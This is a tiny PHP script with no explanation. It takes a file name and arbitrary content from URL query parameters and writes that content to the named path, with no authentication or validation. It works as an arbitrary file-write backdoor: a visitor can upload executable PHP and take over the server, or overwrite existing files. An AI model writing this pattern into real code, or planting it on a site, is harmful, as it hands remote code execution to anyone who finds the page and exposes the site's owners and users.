<?php
    $code = $_GET['sourcecode'];
    $filename = $_GET['file'];

    file_put_contents("$filename", $code);
?>